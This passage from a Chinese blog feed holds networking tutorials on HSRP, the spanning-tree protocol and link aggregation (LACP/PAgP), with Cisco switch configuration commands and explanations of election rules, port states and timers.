id="3-虚拟路由器"><a href="#3-虚拟路由器" class="headerlink" title="(3) 虚拟路由器"></a>(3) 虚拟路由器</h4><p>虚拟路由器就是作为主机设备的网关。</p><p>在这里，根据我们的路由器的工作原理，主机想要不同网络，他会将数据交给自己的路由器，那他是不是就得请求路由器的MAC地址。</p><p>那么这个虚拟路由器要不要MAC地址，那肯定需要的。</p><p>在这个网络中，我们抓一下包</p><p><img src="\media\2023\02\热备份路由选择协议HSRP4.webp" alt=""></p><p>这里就有MAC地址，是先请求网关MAC地址，再把数据发给网关</p><p><img src="\media\2023\02\热备份路由选择协议HSRP5.webp" alt=""></p><p>所以理论上，虚拟路由器也一定有虚拟MAC地址。</p><h4 id="4-其他路由器"><a href="#4-其他路由器" class="headerlink" title="(4) 其他路由器"></a>(4) 其他路由器</h4><h3 id="2-虚拟MAC地址"><a href="#2-虚拟MAC地址" class="headerlink" title="2. 虚拟MAC地址"></a>2. 虚拟MAC地址</h3><p>我们知道，MAC地址是设备出场时厂商固化在设备上的。你这个路由器都是假的，那你的MAC也是假的。</p><p>我们知道，MAC地址是由48位二进制组成，前面24位是厂商编码，后面24是序列号。</p><p>在虚拟MAC地址中，前面24我们不管，后面24位是由虚拟MAC地址的固定值（07AC），加上HSRP的组号（16进制的两位表示）。</p><p>假设组号是1，那么MAC地址就是 07AC01；组号是50，MAC地址是 07AC32</p><h3 id="3-HSRP消息"><a href="#3-HSRP消息" class="headerlink" title="3. HSRP消息"></a>3. HSRP消息</h3><p>他发送的消息采用的是UDP协议，端口号是1985</p><p>采用组播方式发送，组播地址：224.0.0.2</p><p>生命周期 TTL=1</p><h2 id="三-工作原理"><a href="#三-工作原理" class="headerlink" title="三. 工作原理"></a>三. 工作原理</h2><h3 id="具体工作"><a href="#具体工作" class="headerlink" title="具体工作"></a>具体工作</h3><p>如下图所示，主机需要访问外网172.16.3.127，发现不是同一网络，会将数据交给自己的网关。在这里，主机配置的网关为HSRP组中的虚拟路由器。</p><p>虚拟路由收到了数据后，根据HSRP组中的机制（组中路由器的优先级来决定谁是活跃路由器，谁是备份路由器），将数据交给活跃路由器进行转发，活跃路由器再根据自身的路由表进行转发数据。</p><p><img src="\media\2023\02\热备份路由选择协议HSRP6.webp" alt=""></p><p>所以在后面配置的时候就有思路了。</p><ul><li>设置组号，用来决定虚拟路由器的MAC地址</li><li>设置优先级，确定活跃路由器，高的为活跃路由器</li><li>占先，网络中已经存在活跃路由器后，当优先级比较高的路由器想要作为活跃路由器，需要配置占先。占先一般是配置在优先级比较高的路由器上</li><li>端口跟踪。这个用于路由器没坏，线路坏了的时候，就可以设置端口跟踪。</li><li>查看命令</li></ul><h2 id="四-HSRP状态与计时器"><a href="#四-HSRP状态与计时器" class="headerlink" title="四. HSRP状态与计时器"></a>四. HSRP状态与计时器</h2><h3 id="1-状态"><a href="#1-状态" class="headerlink" title="1. 状态"></a>1. 状态</h3><h4 id="1-初始状态"><a href="#1-初始状态" class="headerlink" title="(1) 初始状态"></a>(1) 初始状态</h4><p>当刚给端口配置IP地址的时候，端口开启就进入了初始状态</p><h4 id="2-学习状态"><a href="#2-学习状态" class="headerlink" title="(2) 学习状态"></a>(2) 学习状态</h4><p>该组员未设定虚拟IP 地址，并等待从本组活动路由器发出的认证的 Hello 报文中学习得到自己的虚拟IP 地址</p><h4 id="3-监听状态"><a href="#3-监听状态" class="headerlink" title="(3) 监听状态"></a>(3) 监听状态</h4><p>该组员已得知或设置了虚拟 P 地址，通过监听 Hello 报文监视 活动/备份路由器，一旦发现 活动/备份路由器 长时间未发送Hello 报文，则进入发言 (speak) 状态，开始竞选</p><h4 id="4-发言状态"><a href="#4-发言状态" class="headerlink" title="(4) 发言状态"></a>(4) 发言状态</h4><p>参加竞选 活动/备份路由器 的组员所处的状态，通过发送 Hello 报文使竟选者间相互比较、竞争</p><h4 id="5-备份状态"><a href="#5-备份状态" class="headerlink" title="(5) 备份状态"></a>(5) 备份状态</h4><p>组内备份路由所处的状态。备份组员监视活动路由器，准备随时在活动路由器坏掉时接替活动路由器，备份路由器也周期性发送 Hello 报文告诉其他组员自己没有坏掉</p><h4 id="6-活跃状态"><a href="#6-活跃状态" class="headerlink" title="(6) 活跃状态"></a>(6) 活跃状态</h4><p>组内活动路由器，即负责虚拟路由留实际路由工作的组员所处的状态。活动路由器周期性发送 Hello 报文告诉其他组员自己没有坏掉</p><h3 id="2-计时器"><a href="#2-计时器" class="headerlink" title="2. 计时器"></a>2. 计时器</h3><p>hello 报文间隔时间，默认是3秒</p><p>保持时间10秒，即多久时间来看我是否坏掉</p><h2 id="五-配置"><a href="#五-配置" class="headerlink" title="五. 配置"></a>五. 配置</h2><p>我们这里把三层交换机当路由器用</p><p>这样的一个网络</p><p><img src="\media\2023\02\热备份路由选择协议HSRP7.webp" alt=""></p><p>PC0访问PC1</p><p>我们需要把这两个三层交换机配置为一个HSRP组</p><p>我们分配一下网段和IP地址</p><p>我们先设置三层交换机</p><p>在配置IP的时候有一个问题，在哪里配？</p><p>正常的话就是直接配接口IP是吧。</p><p>我们这里是一个VLAN，如果是两个VLAN的话，你这就有问题了。</p><p>所以我们应该是在默认VLAN里创建虚接口再配置IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">三层交换机0</span><br><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">ip routing</span><br><span class="line">int vlan 1</span><br><span class="line">ip add 192.168.10.254 255.255.255.0</span><br><span class="line">no shutdown </span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">三层交换机1</span><br><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">ip routing</span><br><span class="line">int vlan 1</span><br><span class="line">ip add 192.168.10.253 255.255.255.0</span><br><span class="line">no shutdown </span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>三层交换机配置好后，我们就要去配置HSRP</p><p>我们在VLAN 1创建的IP，那么我们就要在VLAN 1中创建。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">三层交换机0</span><br><span class="line">int vlan 1</span><br><span class="line">standby 33 ip 192.168.10.250  // 设置组号为33（0~255），虚拟IP地址设置为192.168.10.250，这就是主机的网关</span><br><span class="line">standby 33 priority 200       // 该组号的组的优先级为200（0~255） </span><br><span class="line"></span><br><span class="line">三层交换机1</span><br><span class="line">int vlan 1</span><br><span class="line">standby 33 ip 192.168.10.250</span><br><span class="line">standby 33 priority 100</span><br></pre></td></tr></table></figure><p>我们看一下结果</p><p><img src="\media\2023\02\热备份路由选择协议HSRP8.webp" alt=""></p><p>三层交换机0从监听变成发言，备份变成活跃。</p><p>我们现在想要再把三层交换机1配置为活跃。</p><p>我们需要设置优先级，还要配置占先</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">三层交换机1</span><br><span class="line">standby 33 priority 210</span><br><span class="line">standby 33 preempt</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\热备份路由选择协议HSRP9.webp" alt=""></p><p>可以看到，变成了活跃，另一台会变成备份</p>]]></content>
      
      
      <categories>
          
          <category> 网络工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>生成树协议STP及其配置</title>
      <link href="/2023/02/16/27/"/>
      <url>/2023/02/16/27/</url>
      
        <content type="html"><![CDATA[<h2 id="一-引言"><a href="#一-引言" class="headerlink" title="一. 引言"></a>一. 引言</h2><p>现在有这样的一个网络</p><p><img src="\media\2023\01\生成树协议STP及其配置1.webp" alt=""></p><p>我们可以看到，交换机通过各自的协商，完成了端口开启，其中有一个端口是橙色的，说明它没打开，我们来看看这个端口。</p><p>我们这里直接查看生成树</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show spanning-tree</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\生成树协议STP及其配置2.webp" alt=""></p><p>可以看到，这个F0/1接口显示的是BLK，即接口开启但不转发数据，为阻塞端口。</p><p>那如果我们没有这个BLK，即所有接口都是通的，加上设备之后就会出现一个神奇的情况。</p><p><img src="\media\2023\01\生成树协议STP及其配置3.webp" alt=""></p><p>数据从PC1到PC0，经过交换机1的时候进行广播，从F0/1和F0/2接口（现在假设所有接口都是通的）出去，数据就会发到交换机3和交换机2，然后这俩再广播一下，<br>交换机2会将数据发到PC0，但是它还会从另外两个接口发出去，再到交换机3，然后再广播，到交换机1，再广播，到交换机2，然后……。</p><p>这样就会形成回环，数据还在传，但早都到PC0了。<strong>这就产生了没用的流量，形成网络风暴</strong></p><p>有人会问，那我直接不用这种环状网络得了呗。或者说不知道环状网络的用处。我们举个例子。</p><p><img src="\media\2023\01\生成树协议STP及其配置4.webp" alt=""></p><p>这个网络是一个经典的<strong>冗余链路</strong>，其中三个交换机组成了环状网络，路由器会阻断广播所以成不了环状网络</p><p>有数据从二层交换机出来，会随机走1号或者2号链路，然后走4号或者5号链路。</p><p>这种网络的意义就是当有设备/链路出现问题，可以走其他的链路。</p><p>我们回到最开始的那个网络，想一下，为什么是交换机1的F0/1接口为BLK呢？为啥不是其他的交换机？为啥不是F0/2接口？</p><h2 id="二-生成树协议（STP）概念"><a href="#二-生成树协议（STP）概念" class="headerlink" title="二. 生成树协议（STP）概念"></a>二. 生成树协议（STP）概念</h2><p>生成树协议，缩写STP。</p><p>他是工作在OSI模型中的第二层，即数据链路层的一个协议，所以他是在交换机上面的，路由器没有。</p><p>它的目的是为了防止交换网络冗余链路的时候产生网络风暴。</p><p>它是从逻辑方面，阻塞某一个接口，来达到一个树形的网络。</p><p>还是最开始的网络</p><p><img src="\media\2023\01\生成树协议STP及其配置5.webp" alt=""></p><p>交换机1的F0/1被STP堵塞，所以实际上这个网络是这样的。</p><p><img src="\media\2023\01\生成树协议STP及其配置6.webp" alt=""></p><p>真正的网络其实就是红框内的网络，这就是一个经典的树状网络。</p><h2 id="三-STP工作原理"><a href="#三-STP工作原理" class="headerlink" title="三. STP工作原理"></a>三. STP工作原理</h2><h3 id="1-工作原理"><a href="#1-工作原理" class="headerlink" title="1. 工作原理"></a>1. 工作原理</h3><p>它的工作原理就是来进行选举。</p><p>刚才的那个问题，为什么是交换机1的F0/1接口为BLK呢？为啥不是其他的交换机？为啥不是F0/2接口？</p><p>它是通过某一种算法，算出来应该堵塞交换机1的F0/1接口</p><h3 id="2-算法简单过程"><a href="#2-算法简单过程" class="headerlink" title="2. 算法简单过程"></a>2. 算法简单过程</h3><p>就是选举。</p><h4 id="1-选择根网桥"><a href="#1-选择根网桥" class="headerlink" title="(1) 选择根网桥"></a>(1) 选择根网桥</h4><p>我们既然最终是形成树状网络，树只有一个根，网桥就是交换机，根网桥就是根交换机。</p><p>选择根网桥有规范，就是比较网桥ID，网桥ID较小的为根交换机。</p><p>网桥ID分两个部分，网桥的优先级加上网桥的MAC地址。</p><p><strong>先选优先级，优先级小的为根网桥；如果优先级一样，比较MAC地址，MAC地址小的就是根网桥</strong></p><p>比较网桥MAC简单，一个是11-11-11-11-11-11，一个是22-00-00-00-00-00，11的那个MAC地址就小</p><p>网桥优先级，有一个默认值是32768，可以由管理员进行更改，更改的时候注意需要设置为4096的倍数</p><p>根网桥的端口是不可能被阻塞的。</p><h4 id="2-选择根端口"><a href="#2-选择根端口" class="headerlink" title="(2) 选择根端口"></a>(2) 选择根端口</h4><p>首先找根路径成本少的，也就是说其他交换机到根交换机的路径成本最少</p><p>然后就是找直连网桥的ID小的</p><p>还有一个就是找端口ID小的（端口的ID默认是128）</p><h4 id="3-选择指定端口"><a href="#3-选择指定端口" class="headerlink" title="(3) 选择指定端口"></a>(3) 选择指定端口</h4><p>根网桥的所有的端口全是指定端口</p><p>需要在每个网段上面选择一个指定端口，我们这个网段说白了是每条线路。</p><p>非根网桥选指定端口和选择根端口条件一样。</p><h4 id="4-没有被选中的端口就是阻塞端口"><a href="#4-没有被选中的端口就是阻塞端口" class="headerlink" title="(4) 没有被选中的端口就是阻塞端口"></a>(4) 没有被选中的端口就是阻塞端口</h4><p>上面选完之后，剩的那个接口就是阻塞端口。</p><h3 id="3-算法大白话"><a href="#3-算法大白话" class="headerlink" title="3. 算法大白话"></a>3. 算法大白话</h3><p>可能上面的那些你看不懂记不住，没有关系，看这个就行了。</p><p><img src="\media\2023\01\生成树协议STP及其配置7.webp" alt=""></p><p>我们先是找根网桥，我们不用找，直接管理员设置，我们让SW1为根网桥，直接设置优先级就行了，不用管MAC地址，优先级设置为4096，这样SW1就是根网桥。</p><p>然后根网桥上面的端口全是指定端口，我们用DP来表示。</p><p><img src="\media\2023\01\生成树协议STP及其配置8.webp" alt=""></p><p>这样，链路1就有了一个DP端口，链路2也有一个DP端口，然后还得让链路3有一个指定端口，那么AB端口怎么选，根据上面说的那些</p><p>根路径成本最小，AB两个端口的路径成本是一样的，A最短路径是A接口 - SW2 - C接口 - SW1，B也差不多是这么走的，这俩一样。除非这俩带宽不一样，带宽小的成本就高，大的带宽成本就小。</p><p>下一步是网桥ID，太麻烦，直接设置A为指定端口得了。指定A端口的网桥优先级为8192，B端口的网桥优先级还是默认的32768，所以A接口是DP。</p><p>现在根网桥，指定端口整完了，还剩个根端口。C端口和D端口的路径成本最小，这俩就是RP（根端口），那么B端口就是BLK（阻塞端口）</p><p><img src="\media\2023\01\生成树协议STP及其配置9.webp" alt=""></p><p>所以我们刚才只整了SW1的优先级和A端口的优先级，那么BLK一定就是B端口了</p><p>我们刚才没用到网桥ID，我这里写一个展示一下这玩意是啥：32768000C29881125。可以看到就是优先级+MAC地址……</p><h3 id="4-奇怪的场景"><a href="#4-奇怪的场景" class="headerlink" title="4. 奇怪的场景"></a>4. 奇怪的场景</h3><p>我们上一个文章讲了聚合链路，我们现在不聚合</p><p><img src="\media\2023\01\生成树协议STP及其配置10.webp" alt=""></p><p>这样，是不是环形网络？</p><p>这个也是环形网络，假如其中一个是BLK接口，那么它是怎么弄的。</p><p><img src="\media\2023\01\生成树协议STP及其配置11.webp" alt=""></p><p>如果图中和红色的接口是BLK的话，那么交换机B就是根网桥，B上面的两个端口就是指定端口，还剩一个接口就是根端口</p><p><img src="\media\2023\01\生成树协议STP及其配置12.webp" alt=""></p><p>那么为啥那个是RP，路径成本一样，网桥ID一样，就剩了一个端口ID了，说明它的端口ID最小。</p><p>这个端口ID有一个priority（优先级），我们查看STP就能看到，我随便看一个</p><p><img src="\media\2023\01\生成树协议STP及其配置13.webp" alt=""></p><p>这就是端口的优先级，优先级大的端口ID大</p><h2 id="三-STP的其他概念"><a href="#三-STP的其他概念" class="headerlink" title="三. STP的其他概念"></a>三. STP的其他概念</h2><h3 id="STP的收敛"><a href="#STP的收敛" class="headerlink" title="STP的收敛"></a>STP的收敛</h3><p>收敛意思是整个网络达到一直的情况，收敛的过程会产生的交换机的几种状态</p><p>交换机端口的五种状态：</p><ul><li>禁用：down</li><li>阻塞：BLK，不能发送数据，也不能进行MAC地址学习，只会去侦听网络的STP报文（BPDU，叫做拓扑变更通告）</li><li>侦听：可以收发BPDU，但不会进行MAC地址学习</li><li>学习：可以手法BPDU，并且可以进行MAC地址学习，不会转发数据</li><li>转发：正常转发业务数据</li></ul><p>计时器</p><ul><li><strong>Hello Timer</strong>：STP交换机会发送BPDU的时间间隔。当网络拓扑稳定之后，该计时器的修改只有在根桥修改才有效。根桥会在之后发出的BPDU中填充适当的字段以向其他非根桥传递该计时器修改信息。但当拓扑变化之后，TCIN BPDU的发送不受这个计时器的管理</li><li><strong>Forwarding Delay Timer（转发延迟）</strong>：指一个端Listening和Learning的各自时间，默认为15秒，即Listening状态持续15秒，随后Learning状态再持续15秒。这两个状态下的端口会处Blocking状态，这是STP用于避免临时环路的关键</li><li><strong>Max Age（最大老化延迟）</strong>：端口会根据接收到的BPDU存储所接收到的最好的四个信息(根桥BID、累计根路径开销、发送者BID和发送端口PID)。每次接收到合适的BPDU，端口都会启动这个Max Age计时器。超过这个Max Age时间端口接收不到合适BPDU，就会认为网络直径过大。这个时间默认为20秒</li></ul><h2 id="四-STP的配置"><a href="#四-STP的配置" class="headerlink" title="四. STP的配置"></a>四. STP的配置</h2><p>不知道在看的各位有没有注意到一个问题，交换机上会有VLAN的划分，那么当划分了广播域，是不是就阻挡了广播，所以不同的VLAN下有不同的STP</p><h3 id="1-单生成树"><a href="#1-单生成树" class="headerlink" title="1. 单生成树"></a>1. 单生成树</h3><p>所谓单生成树，就是说交换机上只有一个VLAN</p><p>现在有这么一个网络，不要在意这个是路由器，把路由功能关了就是交换机</p><p><img src="\media\2023\01\生成树协议STP及其配置14.webp" alt=""></p><p>我们现在想要指定SW2为根网桥，先看一下它现在是不是，要不然就没意思了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show spanning-tree bri  // 命令和思科不太一样</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\生成树协议STP及其配置15.webp" alt=""></p><p>说明SW2不是根网桥，那么现在就指定SW2为根网桥。然后再指定SW3的f0/3接口为BLK</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conf t  // GNS3默认打开就是特权模式，不用en</span><br><span class="line">no ip routing  // 因为我是拿路由器做交换机的，需要关路由功能</span><br></pre></td></tr></table></figure><p>默认情况下，都是有STP的，我们只需要整一下优先级就行了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spanning-tree vlan 1 priority 4069  // 调整当前交换机的VLAN 1优先级为4096</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\生成树协议STP及其配置16.webp" alt=""></p><p>可以看见，现在本地网桥和根网桥MAC就是一样的了，现在SW2就是根网桥了。</p><p>我们想要设置SW3的f0/3为BLK，那我们就改一下SW1的优先级就行了嘛。</p><p>因为SW2为根网桥，设置SW1的优先级，就可以将SW1的两个接口变成指定接口，然后SW3的f0/3根据路程成本来看，肯定是BLK。</p><p>如果看不懂，再上面“算法大白话”中讲过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conf t</span><br><span class="line">spanning-tree vlan 1 priority 8192  </span><br><span class="line">// 这个优先级一定要比根网桥的大。因为要是一样的话，如果SW1的MAC地址小，那么SW1成根网桥了。</span><br></pre></td></tr></table></figure><p>这样F0/3就是BLK，我们现在看一下</p><p><img src="\media\2023\01\生成树协议STP及其配置17.webp" alt=""></p><p>这个配置就没有啥技术含量</p><h3 id="2-多生成树"><a href="#2-多生成树" class="headerlink" title="2. 多生成树"></a>2. 多生成树</h3><p>所谓多生成树，就是说交换机上有多个VLAN</p><p>有这样的一个网络</p><p><img src="\media\2023\01\生成树协议STP及其配置18.webp" alt=""></p><p>我们先设置一下VLAN和trunk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">交换机0：</span><br><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">vlan 10</span><br><span class="line">vlan 20</span><br><span class="line">exit</span><br><span class="line">int f0/3</span><br><span class="line">sw acc vlan 10</span><br><span class="line">int f0/4</span><br><span class="line">sw acc vlan 20</span><br><span class="line">exit</span><br><span class="line">int range f0/1-2</span><br><span class="line">sw mode trunk</span><br><span class="line"></span><br><span class="line">交换机1：</span><br><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">vlan 10</span><br><span class="line">exit</span><br><span class="line">int f0/3</span><br><span class="line">sw acc vlan 10</span><br><span class="line">int range f0/1-2</span><br><span class="line">sw mode trunk</span><br><span class="line"></span><br><span class="line">交换机2：</span><br><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">vlan 20</span><br><span class="line">exit</span><br><span class="line">int f0/3</span><br><span class="line">sw acc vlan 20</span><br><span class="line">int range f0/1-2</span><br><span class="line">sw mode trunk</span><br></pre></td></tr></table></figure><p>现在全是trunk了</p><p><img src="\media\2023\01\生成树协议STP及其配置19.webp" alt=""></p><p>从图上看，好像没有BLK，但是实际上还是有的。</p><p>我们看一下交换机0的生成树</p><p><img src="\media\2023\01\生成树协议STP及其配置20.webp" alt=""></p><p>可以看到，交换机0的VLAN 10中的F0/2是BLK</p><p>我们现在想要把交换机1配置成VLAN 10的根网桥，把交换机2配置成VLAN 20的根网桥。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">交换机1：</span><br><span class="line">conf t</span><br><span class="line">spanning-tree vlan 10 priority 4096  // 这样交换机1就是VLAN 10根网桥了</span><br><span class="line"></span><br><span class="line">交换机2：</span><br><span class="line">conf t</span><br><span class="line">spanning-tree vlan 20 priority 4096  // 这样交换机2就是VLAN 20根网桥了</span><br></pre></td></tr></table></figure><p>那么他们对应的BLK是啥，我们现在还不知道</p><p>我们直接看生成树就行了。</p><p><img src="\media\2023\01\生成树协议STP及其配置21-1024x589.webp" alt=""></p><p>但是VLAN 20没找到，应该是在交换机1上，但是我们交换机1没有VLAN 20</p><p>我们在交换机1上创建一个VLAN 20，然后在重新运行一下spanning-tree vlan 20 priority 4096，然后等一会再看看。</p><p>我的结果是，交换机1上没有VLAN 20的BLK，交换机0上有了。每个人结果有可能不一样。</p><p><img src="\media\2023\01\生成树协议STP及其配置22.webp" alt=""></p><p>所以交换机0上的F0/2接口，又是VLAN 10的BLK，又是VLAN 20的BLK。</p><h3 id="3-其他配置"><a href="#3-其他配置" class="headerlink" title="3. 其他配置"></a>3. 其他配置</h3><p>这里的一般用不到，了解一下就行</p><h4 id="1-直接设置设备为根网桥"><a href="#1-直接设置设备为根网桥" class="headerlink" title="(1) 直接设置设备为根网桥"></a>(1) 直接设置设备为根网桥</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spanning-tree vlan 1 root primary  // 设置当前设备为VLAN 1根网桥</span><br></pre></td></tr></table></figure><p>因为默认的是32768，如果我们通过这条命令来指定根网桥，他就会让当前设备在32798的基础上，降4096，这样他的优先级就比其他的大。</p><h4 id="2-修改端口成本"><a href="#2-修改端口成本" class="headerlink" title="(2) 修改端口成本"></a>(2) 修改端口成本</h4><p>端口成本由带宽来决定。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spanning-tree vlan 1 cost 19  // 百兆带宽路径成本是19，千兆带宽路径成本是1</span><br></pre></td></tr></table></figure><h4 id="3-修改端口优先级"><a href="#3-修改端口优先级" class="headerlink" title="(3) 修改端口优先级"></a>(3) 修改端口优先级</h4><p>本来端口优先级是128，我们可以修改为2的次方数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spanning-tree vlan 1 port-priority 64  // 修改为64</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>链路聚合</title>
      <link href="/2023/02/16/21/"/>
      <url>/2023/02/16/21/</url>
      
        <content type="html"><![CDATA[<p>我们看这个网络</p><p><img src="\media\2023\01\链路聚合相关知识1.webp" alt=""></p><p>所有的数据都会通过中间那条链路传递到三层交换机，这条链路的压力会很大。</p><p>有没有可能，我们再加一条链路，去分摊数据转发压力。</p><p><img src="\media\2023\01\链路聚合相关知识2.webp" alt=""></p><p>这时候就需要用到链路聚合了。</p><p>可能有人说，我直接链条链路全是trunk链路不就好了嘛，如果这样设置的话，它只是在两条链路中随机的进行传递，不能起到分摊压力的功能。</p><p>我们做了链路聚合后，从物理上，看得是两条链路，但从逻辑上，它俩是一条链路，实现负载</p><h2 id="一-链路聚合"><a href="#一-链路聚合" class="headerlink" title="一. 链路聚合"></a>一. 链路聚合</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1. 定义"></a>1. 定义</h3><p>以太网链路聚合<strong>Eth-Trunk</strong>简称<strong>链路聚合</strong>，它通过将多条以太网物理链路捆绑在一起成为一条逻辑链路，从而实现增加链路带宽的目的。同时，这些捆绑在一起的链路通过相互间的动态备份，可以有效地提高链路的可靠性。</p><h3 id="2-目的"><a href="#2-目的" class="headerlink" title="2. 目的"></a>2. 目的</h3><p>随着网络规模不断扩大，用户对骨干链路的带宽和可靠性提出越来越高的要求。在传统技术中，常用更换高速率的设备的方式来增加带宽，但这种方案需要付出高额的费用，而且不够灵活。</p><p>采用链路聚合技术可以在不进行硬件升级的条件下，通过将多个物理接口捆绑为一个逻辑接口，达到增加链路带宽的目的。在实现增大带宽目的的同时，链路聚合采用备份链路的机制，可以有效的提高设备之间链路的可靠性。</p><h3 id="3-优势"><a href="#3-优势" class="headerlink" title="3. 优势"></a>3. 优势</h3><p>链路聚合技术主要有以下三个优势：</p><p><strong>1、增加带宽</strong></p><p>链路聚合接口的最大带宽可以达到各成员接口带宽之和。</p><p><strong>2、提高可靠性</strong></p><p>当某条活动链路出现故障时，流量可以切换到其他可用的成员链路上，从而提高链路聚合接口的可靠性。</p><p><strong>3、负载分担</strong></p><p>在一个链路聚合组内，可以实现在各成员活动链路上的负载分担。</p><h3 id="4-LACP"><a href="#4-LACP" class="headerlink" title="4. LACP"></a>4. LACP</h3><p>我们配置思科设备上的链路聚合用的是LACP协议</p><p>基于IEEE802.3ad标准的LACP（链路汇聚控制协议）是一种实现链路动态汇聚的协议。</p><p>LACP协议通过LACPDU（链路汇聚控制协议数据单元）与对端交互信息。</p><p>启用某端口的LACP协议后，该端口将通过发送LACPDU向对端通告自己的系统优先级、系统MAC地址、端口优先级、端口号和操作Key。</p><p>对端接收到这些信息后，将这些信息与其它端口所保存的信息比较以选择能够汇聚的端口，从而双方可以对端口加入或退出某个动态汇聚组达成一致。</p><h2 id="二-链路聚合实现方式"><a href="#二-链路聚合实现方式" class="headerlink" title="二. 链路聚合实现方式"></a>二. 链路聚合实现方式</h2><h3 id="1-思科设备（PAgP）"><a href="#1-思科设备（PAgP）" class="headerlink" title="1. 思科设备（PAgP）"></a>1. 思科设备（PAgP）</h3><p>在思科设备上有一个PAgP</p><p>PAgP（Port Aggregration Protocol 端口聚合协议）是Cisco私有协议，可以自动创建以太通道链路。使用PAgP配置以太通道链路时，以太通道可用的端口之间就会发送PAgP的数据包来协商建立通道。</p><h3 id="2-标准的（LACP）"><a href="#2-标准的（LACP）" class="headerlink" title="2. 标准的（LACP）"></a>2. 标准的（LACP）</h3><p>基于802.3ad的LACP</p><p><strong>注：LACP最初定义为 IEEE 802.3ad。但是，现在LACP在针对局域网和城域网较新的 IEEE 802.1AX标准中进行定义。</strong></p><p>LACP（Link Aggregration Control Protocol）是属于IEEE规范（802.3ad），允许将多个物理端口捆绑形成单个逻辑通道。它的功能类似于思科的以太通道协议PAgP。</p><h3 id="3-链路聚合模式"><a href="#3-链路聚合模式" class="headerlink" title="3. 链路聚合模式"></a>3. 链路聚合模式</h3><p>我们根据模式来决定，是使用思科私有的PAgP还是使用标准的LACP</p><p><strong>PAgP的3中模式：</strong></p><ul><li>On（手动配置模式）：这种模式会强制接口不使用PAgP来建立通道。那在“On”模式下配置的接口必然不会交换PAgP数据包。</li><li>PAgP desirable（主动协商模式）：接口会通过发送PAgP数据包来<strong>主动</strong>发起与其他接口之间的协商</li><li>PAgP auto（被动协商模式）：接口会<strong>响应</strong>它<strong>收到</strong>的PAgP数据包，但不会主动发起PAgP协商。 <strong>LACP的3中模式</strong></li><li>On（手动配置模式）：这中模式会强制接口不使用LACP来建立通道。“On”模式下配置的接口不会交换LACP数据包。</li><li>LACP active：该模式让端口处于主动协商模式。</li><li>LACP passive：该模式让端口处于被动协商模式。</li></ul><h2 id="三-基于IEEE的LACP"><a href="#三-基于IEEE的LACP" class="headerlink" title="三. 基于IEEE的LACP"></a>三. 基于IEEE的LACP</h2><h3 id="1-交互信息"><a href="#1-交互信息" class="headerlink" title="1. 交互信息"></a>1. 交互信息</h3><p>了解一下就行</p><p><img 